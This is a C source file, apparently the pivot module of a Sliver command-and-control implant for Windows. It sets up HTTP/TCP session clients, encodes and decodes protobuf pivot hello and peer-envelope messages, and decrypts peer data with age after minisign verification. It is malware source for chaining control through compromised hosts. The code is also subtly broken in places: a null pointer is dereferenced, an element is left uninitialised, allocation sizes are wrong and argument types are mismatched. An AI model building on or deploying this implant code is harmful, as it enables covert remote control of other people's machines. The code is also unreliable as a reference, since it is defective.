#include "pch.h"

PSLIVER_SESSION_CLIENT PivotInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
)
{
	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
	UINT64 uReconnectDuration = 300;
	DWORD dwPollInterval = 1.5;

	pSessionClient = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
	pSessionClient->pGlobalConfig = pGlobalConfig;
	pSessionClient->dwPollInterval = dwPollInterval;
#ifdef _HTTP
	pSessionClient->Init = (CLIENT_INIT)HttpInit;
	pSessionClient->Start = HttpStart;
	pSessionClient->Send = HttpSend;
	pSessionClient->Receive = HttpRecv;
	pSessionClient->Close = HttpClose;
	pSessionClient->Cleanup = HttpCleanup;
#elif _TCP
	pSessionClient->Init = (CLIENT_INIT)TcpInit;
	pSessionClient->Start = TcpStart;
	pSessionClient->Send = TcpSend;
	pSessionClient->Receive = TcpRecv;
	pSessionClient->Close = TcpClose;
	pSessionClient->Cleanup = TcpCleanup;
#endif

CLEANUP:
	return pSessionClient;
}

PBUFFER MarshalPivotHello
(
	PGLOBAL_CONFIG pGlobalConfig
)
{
	PPBElement Elements[4];
	PPBElement pFinalElement = NULL;
	PBUFFER pResult = NULL;

	SecureZeroMemory(Elements, sizeof(Elements));
	Elements[0] = CreateBytesElement(pGlobalConfig->lpPeerPubKey, lstrlenA(pGlobalConfig->lpPeerPubKey), 1);
	Elements[1] = CreateVarIntElement(pGlobalConfig->uPeerID, 2);
	Elements[2] = CreateBytesElement(pGlobalConfig->lpPeerAgePublicKeySignature, lstrlenA(pGlobalConfig->lpPeerAgePublicKeySignature), 3);

	pFinalElement = CreateStructElement(Elements, _countof(Elements), 0);
	pResult = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
	FreeElement(pFinalElement);

	return pResult;
}

PPIVOT_HELLO UnmarshalPivotHello
(
	PBUFFER pInput
)
{
	PPBElement Elements[4];
	PPIVOT_HELLO pResult = NULL;
	DWORD i = 0;
	LPVOID* UnmarshaledData = NULL;

	for (i = 0; i < _countof(Elements); i++) {
		Elements[i] = ALLOC(sizeof(PBElement));
		Elements[i]->dwFieldIdx = i + 1;
		Elements[i]->Type = Bytes;
	}

	Elements[1]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(Elements, _countof(Elements), pInput->pBuffer, pInput->cbBuffer, NULL);
	pResult = ALLOC(sizeof(PIVOT_HELLO));
	pResult->pPublicKey = (PBUFFER)UnmarshaledData[0];
	pResult->uPeerID = (UINT64)UnmarshaledData[1];
	pResult->lpPublicKeySignature = DuplicateStrA(((PBUFFER)UnmarshaledData[2])->pBuffer, 0);
	pResult->pSessionKey = (PBUFFER)UnmarshaledData[3];

	if (UnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshaledData[2]);
		FreeBuffer((PBUFFER)UnmarshaledData[3]);
		FREE(UnmarshaledData);
	}

	return pResult;
}

PPIVOT_PEER_ENVELOPE UnmarhsalPivotPeerEnvelope
(
	_In_ PBUFFER pInput
)
{
	PPBElement PivotPeerEnvelopeElement[5];
	PPBElement PivotPeerElement[2];
	LPVOID* UnmarshaledData = NULL;
	LPVOID* UnmarshaledPivotPeer = NULL;
	DWORD i = 0;
	PPIVOT_PEER_ENVELOPE pResult = NULL;
	PBUFFER pTempBuffer = NULL;

	SecureZeroMemory(PivotPeerEnvelopeElement, sizeof(PivotPeerEnvelopeElement));
	for (i = 0; i < _countof(PivotPeerEnvelopeElement); i++) {
		PivotPeerEnvelopeElement[i] = ALLOC(sizeof(PBElement));
		PivotPeerEnvelopeElement[i]->dwFieldIdx = i + 1;
	}

	PivotPeerEnvelopeElement[0]->Type = RepeatedBytes;
	PivotPeerEnvelopeElement[1]->Type = Varint;
	PivotPeerEnvelopeElement[2]->Type = Bytes;
	PivotPeerEnvelopeElement[3]->Type = Bytes;
	PivotPeerEnvelopeElement[4]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(PivotPeerEnvelopeElement, _countof(PivotPeerEnvelopeElement), pInput->pBuffer, pInput->cbBuffer, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	pResult->pPivotSessionID = (PBUFFER)UnmarshaledData[2];
	UnmarshaledData[2] = NULL;

	pResult->pData = (PBUFFER)UnmarshaledData[3];
	UnmarshaledData[3] = NULL;

	pResult->uType = (UINT64)UnmarshaledData[1];
	pResult->PeerFailureAt = (UINT64)UnmarshaledData[4];
	if (UnmarshaledData[0] != NULL) {
		SecureZeroMemory(PivotPeerElement, sizeof(PivotPeerElement));
		PivotPeerElement[0] = ALLOC(sizeof(PBElement));
		PivotPeerElement[0]->dwFieldIdx = 1;
		PivotPeerElement[0]->Type = Varint;

		PivotPeerElement[1] = ALLOC(sizeof(PBElement));
		PivotPeerElement[1]->dwFieldIdx = 2;
		PivotPeerElement[1]->Type = Bytes;

		pResult->cPivotPeers = *(PUINT64)(UnmarshaledData[0]);
		pResult->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pResult->cPivotPeers);
		for (i = 0; i < pResult->cPivotPeers; i++) {
			pTempBuffer = ((PBUFFER*)(UnmarshaledData[0]))[i + 1];
			UnmarshaledPivotPeer = UnmarshalStruct(PivotPeerElement, _countof(PivotPeerElement), pTempBuffer->pBuffer, pTempBuffer->cbBuffer, NULL);
			pResult->PivotPeers[i] = ALLOC(sizeof(PIVOT_PEER));
			pResult->PivotPeers[i]->lpName = DuplicateStrA(((PBUFFER)UnmarshaledPivotPeer[1])->pBuffer, 0);
			pResult->PivotPeers[i]->uPeerID = (UINT64)UnmarshaledPivotPeer[0];

			FreeBuffer((PBUFFER)UnmarshaledPivotPeer[1]);
			FREE(UnmarshaledPivotPeer);
			FreeBuffer(pTempBuffer);
		}

		FREE(UnmarshaledData[0]);
	}

CLEANUP:
	for (i = 0; i < _countof(PivotPeerEnvelopeElement); i++) {
		FreeElement(PivotPeerEnvelopeElement[i]);
	}

	for (i = 0; i < _countof(PivotPeerElement); i++) {
		FreeElement(PivotPeerElement[i]);
	}

	FREE(UnmarshaledData);

	return pResult;
}

PBUFFER MarhsalPivotPeerEnvelope
(
	_In_ PPIVOT_PEER_ENVELOPE pEnvelope
)
{
	PBUFFER pResult = NULL;
	PPBElement pFinalElement = NULL;
	PPBElement PivotPeerEnvelopeElement[5];
	PPBElement PivotPeerElement[2];
	DWORD i = 0;
	PPBElement* ElementList = NULL;

	PivotPeerEnvelopeElement[1] = CreateVarIntElement(pEnvelope->uType, 2);
	if (pEnvelope->pData != NULL) {
		PivotPeerEnvelopeElement[3] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 4);
	}

	if (pEnvelope->pPivotSessionID != NULL) {
		PivotPeerEnvelopeElement[2] = CreateBytesElement(pEnvelope->pPivotSessionID->pBuffer, pEnvelope->pPivotSessionID->cbBuffer, 3);
	}

	PivotPeerEnvelopeElement[4] = CreateVarIntElement(pEnvelope->PeerFailureAt, 5);
	if (pEnvelope->PivotPeers != NULL) {
		ElementList = ALLOC(sizeof(PPBElement) * pEnvelope->cPivotPeers);
		for (i = 0; i < pEnvelope->cPivotPeers; i++) {
			PivotPeerElement[0] = CreateVarIntElement(pEnvelope->PivotPeers[i]->uPeerID, 1);
			PivotPeerElement[1] = CreateVarIntElement(pEnvelope->PivotPeers[i]->lpName, lstrlenA(pEnvelope->PivotPeers[i]->lpName), 2);
			ElementList[i] = CreateStructElement(PivotPeerElement, _countof(PivotPeerElement), 0);
		}

		PivotPeerEnvelopeElement[0] = CreateRepeatedStructElement(ElementList, pEnvelope->cPivotPeers, 1);
		FREE(ElementList);
	}

	pFinalElement = CreateStructElement(PivotPeerEnvelopeElement, _countof(PivotPeerEnvelopeElement), 0);
	pResult = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;

	FreeElement(pFinalElement);

	return pResult;
}

VOID FreePivotPeerEnvelope
(
	_In_ PPIVOT_PEER_ENVELOPE pEnvelope
)
{
	DWORD i = 0;
	PPIVOT_PEER pPivotPeer = NULL;

	if (pEnvelope != NULL) {
		FreeBuffer(pEnvelope->pPivotSessionID);
		FreeBuffer(pEnvelope->pData);
		for (i = 0; i < pEnvelope->cPivotPeers; i++) {
			pPivotPeer = pEnvelope->PivotPeers[i];
			FREE(pPivotPeer->lpName);
			FREE(pPivotPeer);
		}

		FREE(pEnvelope->PivotPeers);
	}
}

VOID FreePivotHello
(
	_In_ PPIVOT_HELLO pPivotHello
)
{
	if (pPivotHello != NULL) {
		FreeBuffer(pPivotHello->pPublicKey);
		FreeBuffer(pPivotHello->pSessionKey);
		FREE(pPivotHello->lpPublicKeySignature);
		FREE(pPivotHello);
	}
}

PBUFFER AgeDecryptFromPeer
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PBUFFER pSenderPublicKey,
	_In_ LPSTR lpSenderPublicKeySig,
	_In_ PBUFFER pCiphertext
)
{
	if (!MinisignVerify(pSenderPublicKey, lpSenderPublicKeySig, pConfig->lpServerMinisignPublicKey)) {
		return NULL;
	}

	return AgeDecrypt(pConfig->lpPeerPrivKey, pCiphertext);
}